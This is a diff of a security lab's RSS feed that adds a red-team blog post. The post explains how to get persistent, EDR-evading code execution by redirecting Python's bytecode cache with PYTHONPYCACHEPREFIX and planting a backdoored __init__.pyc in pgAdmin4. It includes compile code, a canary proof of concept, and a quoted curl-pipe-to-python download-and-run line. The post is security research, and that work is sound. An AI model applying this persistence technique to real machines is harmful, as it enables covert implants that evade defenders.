@@ -6,7 +6,86 @@
     <description>Recent content on SRA Labs | Cybersecurity Research &amp; Innovation by Security Risk Advisors</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 26 May 2026 12:00:00 +0000</lastBuildDate><atom:link href="https://labs.sra.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 02 Jun 2026 12:00:00 +0000</lastBuildDate><atom:link href="https://labs.sra.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Abusing PYTHONPYCACHEPREFIX</title>
+      <link>https://labs.sra.io/posts/pythonpycacheprefix/</link>
+      <pubDate>Tue, 02 Jun 2026 12:00:00 +0000</pubDate>
+      
+      <guid>https://labs.sra.io/posts/pythonpycacheprefix/</guid>
+      <description>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Using high-level languages for code execution and persistence has become a fairly popular trend as of late. I&amp;rsquo;m reminded of &lt;a href=&#34;https://trustedsec.com/blog/operating-inside-the-interpreted-offensive-python&#34; target=&#34;_blank&#34;&gt;this post&lt;/a&gt; from TrustedSec talking about exactly this. The author discusses how to install Python to a Windows system and provides an overview of what kind of capabilities are available, including how to use &lt;code&gt;ctypes&lt;/code&gt; for running unmanaged code. Commercial offensive tooling vendors like &lt;a href=&#34;https://x.com/BallisKit/status/1848398358164971999&#34; target=&#34;_blank&#34;&gt;Balliskit&lt;/a&gt; support Python payloads, and there are even full C2 implants built with it (&lt;a href=&#34;https://github.com/MythicAgents/Medusa&#34; target=&#34;_blank&#34;&gt;Medusa&lt;/a&gt;, &lt;a href=&#34;https://github.com/naksyn/Pyramid&#34; target=&#34;_blank&#34;&gt;Pyramid&lt;/a&gt;, &lt;a href=&#34;https://github.com/nettitude/poshc2&#34; target=&#34;_blank&#34;&gt;PoshC2&lt;/a&gt;).&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Using high-level languages for code execution and persistence has become a fairly popular trend as of late. I&amp;rsquo;m reminded of &lt;a href=&#34;https://trustedsec.com/blog/operating-inside-the-interpreted-offensive-python&#34; target=&#34;_blank&#34;&gt;this post&lt;/a&gt; from TrustedSec talking about exactly this. The author discusses how to install Python to a Windows system and provides an overview of what kind of capabilities are available, including how to use &lt;code&gt;ctypes&lt;/code&gt; for running unmanaged code. Commercial offensive tooling vendors like &lt;a href=&#34;https://x.com/BallisKit/status/1848398358164971999&#34; target=&#34;_blank&#34;&gt;Balliskit&lt;/a&gt; support Python payloads, and there are even full C2 implants built with it (&lt;a href=&#34;https://github.com/MythicAgents/Medusa&#34; target=&#34;_blank&#34;&gt;Medusa&lt;/a&gt;, &lt;a href=&#34;https://github.com/naksyn/Pyramid&#34; target=&#34;_blank&#34;&gt;Pyramid&lt;/a&gt;, &lt;a href=&#34;https://github.com/nettitude/poshc2&#34; target=&#34;_blank&#34;&gt;PoshC2&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;However, running PowerShell to install Python or even dropping arbitrary Python files to disk can be a risky endeavor within a well-hardened environment. We can do better.&lt;/p&gt;
+&lt;h1 id=&#34;lotl&#34;&gt;LOTL&lt;/h1&gt;
+&lt;p&gt;A few years back, I was performing a red team engagement against an exceptionally well-hardened environment. They&amp;rsquo;re a client we&amp;rsquo;ve worked with for a long time, and they&amp;rsquo;ve taken all of our recommendations very seriously. Much to their benefit, and the loss of my sanity, the end user workstations had become about as well hardened as any reasonable enterprise could achieve. Tuned EDR, full allowlisting via WDAC, the works. Desperate and racking my brain for something novel, I started going through the applications available within the company portal. After pulling PgAdmin4 and looking through the assets that get installed, I noticed that a portable Python runtime was included.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;pgadmin4.png&#34;  alt=&#34;A portal Python runtime&#34;   style=&#34;border-radius: 8px;&#34;  /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;This alone is a huge boon when fighting against EDR: executing directly from a trusted process in a trusted location. But we still need a means to actually load a payload. We could drop a file to disk and execute, but static file analysis very well may get you caught. You could obfuscate, but then you&amp;rsquo;ve got to deal with entropy checks. You could also just invoke Python directly, dynamically loading the payload a la &lt;code&gt;curl https://example.com/payload.py | .\python.exe&lt;/code&gt;. This obviously has all kinds of drawbacks related to cmd/PowerShell telemetry.&lt;/p&gt;
+&lt;h1 id=&#34;pythonpycacheprefix&#34;&gt;PYTHONPYCACHEPREFIX&lt;/h1&gt;
+&lt;p&gt;The Python3 runtime can be controlled in a number of ways, primarily through command line arguments and environment variables. You can find them documented &lt;a href=&#34;https://docs.python.org/3/using/cmdline.html&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;. As the title suggests, we&amp;rsquo;ll be looking at the &lt;code&gt;PYTHONPYCACHEPREFIX&lt;/code&gt; environment variable. From the docs:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;If this is set, Python will write &lt;code&gt;.pyc&lt;/code&gt; files in a mirror directory tree at this path, instead of in &lt;code&gt;__pycache__&lt;/code&gt; directories within the source tree. This is equivalent to specifying the -X &lt;code&gt;pycache_prefix=PATH&lt;/code&gt; option.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Lets set this var to something we have write-access to. In this case: an AppData subdirectory.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;env_var.png&#34;  alt=&#34;Setting the PYTHONPYCACHEPREFIX env var&#34;   style=&#34;border-radius: 8px;&#34;  /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;When launching the app, you&amp;rsquo;ll see a number of new directories and &lt;code&gt;.pyc&lt;/code&gt; files have been created.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;cache_files_0.png&#34;  alt=&#34;Cache files created&#34;   style=&#34;border-radius: 8px;&#34;  /&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;cache_files_1.png&#34;  alt=&#34;Cache files created&#34;   style=&#34;border-radius: 8px;&#34;  /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;generating-python-bytecode&#34;&gt;Generating Python Bytecode&lt;/h1&gt;
+&lt;p&gt;Now we have a primitive for obtaining write-access to a trusted process&amp;rsquo;s files. The next step is to weaponize it. This will involve backdooring the &lt;code&gt;.pyc&lt;/code&gt; files themselves. These files can be dynamically created by using the &lt;code&gt;py_compile&lt;/code&gt; native module (docs &lt;a href=&#34;https://docs.python.org/3/library/py_compile.html#&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;). Importantly, as we&amp;rsquo;re compiling to bytecode, the Python release we&amp;rsquo;re using to generate these files needs to exactly match the environment we&amp;rsquo;re targetting. For PgAdmin4 v9.11.1, this is Python 3.13.9.&lt;/p&gt;
+&lt;p&gt;If you&amp;rsquo;re not familiar with Python, the &lt;code&gt;___init.py___&lt;/code&gt; file is a special initialization file that&amp;rsquo;s invoked when a package is imported. Given its ubiquitous use, this makes it a great backdoor candidate. For our POC, we&amp;rsquo;re going to create a simple canary file:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:/Temp/canary.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chirp&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can then compile this into a &lt;code&gt;.pyc&lt;/code&gt; file with the following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; py_compile &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; compile, PycInvalidationMode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;infile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:/Users/titan/Desktop/example.py&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;outfile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:/Users/titan/Desktop/__init__.pyc&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;compile(infile, cfile&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;outfile, invalidation_mode&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;PycInvalidationMode&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;UNCHECKED_HASH)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;An important bit here is the &lt;code&gt;PycInvalidationMode.UNCHECKED_HASH&lt;/code&gt; invalidation mode. This tells the Python runtime to always respect the cache file, even if the original &lt;code&gt;.py&lt;/code&gt; file has been modified. This ensures the malicious &lt;code&gt;.pyc&lt;/code&gt; persists. Now if we drop this file into the cache directory and reload the PgAdmin4 app, the canary file will be created. This will cause the app to just crash, but that&amp;rsquo;s not surprising.&lt;/p&gt;
+&lt;p&gt;Fully weaponizing this is fairly trivial. All we have to do is grab the original &lt;code&gt;___init__.py&lt;/code&gt; file, add our malicious code, and recompile. To target the &lt;code&gt;pycache/Program Files/pgAdmin 4/web/pgadmin/__init__.cpython-313.pyc&lt;/code&gt; cache file, we can pull the original from &lt;code&gt;C:/Program Files/pgAdmin 4/web/pgadmin/__init__.py&lt;/code&gt;. Drop your malicious code right after the &lt;code&gt;import&lt;/code&gt; statements, recompile, drop to disk, et voilà: you now have an implant executing within the context of the parent PgAdmin4 process.&lt;/p&gt;
+&lt;h1 id=&#34;a-note-on-pgadmin4-v9112&#34;&gt;A Note on PgAdmin4 v9.11.2+&lt;/h1&gt;
+&lt;p&gt;I&amp;rsquo;ve used this technique across several engagements at this point; it&amp;rsquo;s a surprisingly common app to find within a company portal. However, when going to write this blog, I noticed that PgAdmin4 no longer writes the bytecode files to the expected location. This seems to have started with v9.11.2, which released in Feb 2026. The previous version, v9.11.1, and all other versions I&amp;rsquo;ve tried this against, work as intended. Discussing with a coworker, it appears this &lt;a href=&#34;https://github.com/pgadmin-org/pgadmin4/commit/6000cc0fb40971a9dd36c47e1eeb3b9bb6f7d2a3#diff-a44253f1e401f8e72af47caf141650994eedac28838375600d23abf3e812aa5aR233-R234&#34; target=&#34;_blank&#34;&gt;commit&lt;/a&gt; introduced a &amp;ldquo;macOS fix&amp;rdquo; which disables bytecode generation. Ironically enough, this was enabled by using a different Python env var: &lt;code&gt;PYTHONDONTWRITEBYTECODE&lt;/code&gt;. We can confirm this by pulling up the server log:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;pythondontwritebytecode.png&#34;  alt=&#34;PYTHONDONTWRITEBYTECODE enabled&#34;   style=&#34;border-radius: 8px;&#34;  /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;But not all hope is lost. As the env var name suggests, this only disables &lt;em&gt;writing&lt;/em&gt; bytecode and not &lt;em&gt;reading&lt;/em&gt; bytecode. To verify this, I modified &lt;code&gt;C:/Program Files/pgAdmin 4/runtime/resources/app/src/js/pgadmin.js&lt;/code&gt;, commenting out the &lt;code&gt;process.env.PYTHONDONTWRITEBYTECODE = &#39;1&#39;;&lt;/code&gt; line. Restarting the app generated the bytecode, and I created the same &lt;code&gt;___init__.cpython-313.pyc&lt;/code&gt; POC as before. After restoring the &lt;code&gt;PYTHONDONTWRITEBYTECODE&lt;/code&gt; env var and restarting the app, the canary file was successfully created.&lt;/p&gt;
+&lt;p&gt;On a live engagement, you won&amp;rsquo;t be able to modify the &lt;code&gt;pgadmin.js&lt;/code&gt; file to entice the bytecode generation. However, you could do this on a machine you control and then push all the cache files onto the target machine. You could also opt to only drop the single malicious &lt;code&gt;.pyc&lt;/code&gt; file. An EDR likely won&amp;rsquo;t care whether there is a single &lt;code&gt;.pyc&lt;/code&gt; or an entire directory tree&amp;rsquo;s worth, but this may stand out to an adept incident response team.&lt;/p&gt;
+&lt;h1 id=&#34;on-other-applications&#34;&gt;On Other Applications&lt;/h1&gt;
+&lt;p&gt;To be clear: this primitive is not specific to PgAdmin4. Any application that bundles or otherwise invokes a Python runtime from a user context could be exploited this way. A cursory glance shows that Sublime Text and GIMP use Python for plugin support. Alternatively, a Python developer and all their tooling could be targetted this way, including JupyterLabs Desktop. As long as the target cache file maps to a file that is regularly executed by the user, it can be used as a means of peristence.&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>PacketHuffer: Making Sense of Kismet Data</title>
       <link>https://labs.sra.io/posts/packethuffer/</link>
@@ -281,8 +360,8 @@
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;527634981&#34; type=&#34;checkbox&#34; checked /&gt;
-    &lt;label for=&#34;527634981&#34;&gt;
+    &lt;input id=&#34;637529481&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;637529481&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;PYTHON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;CaptinCredz Plugin&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -393,8 +472,8 @@ class Plugin:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;125786439&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;125786439&#34;&gt;
+    &lt;input id=&#34;326194785&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;326194785&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;JSON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Restricting PassRole via a Resource&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -420,8 +499,8 @@ class Plugin:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;218376945&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;218376945&#34;&gt;
+    &lt;input id=&#34;146278395&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;146278395&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;JSON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Restricting PassRole via iam:PassedToService&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -451,8 +530,8 @@ class Plugin:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;296314587&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;296314587&#34;&gt;
+    &lt;input id=&#34;897354216&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;897354216&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;JSON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Restricting PassRole via iam:AssociatedResourceARN&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -526,8 +605,8 @@ class Plugin:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;867352491&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;867352491&#34;&gt;
+    &lt;input id=&#34;257869413&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;257869413&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Statement walking&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -589,8 +668,8 @@ for result in results:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;481527693&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;481527693&#34;&gt;
+    &lt;input id=&#34;135684297&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;135684297&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;JSON&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Trust policy&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
@@ -670,8 +749,8 @@ for result in results:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;358172496&#34; type=&#34;checkbox&#34; checked /&gt;
-    &lt;label for=&#34;358172496&#34;&gt;
+    &lt;input id=&#34;432596178&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;432596178&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;PassRole Enrichment&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
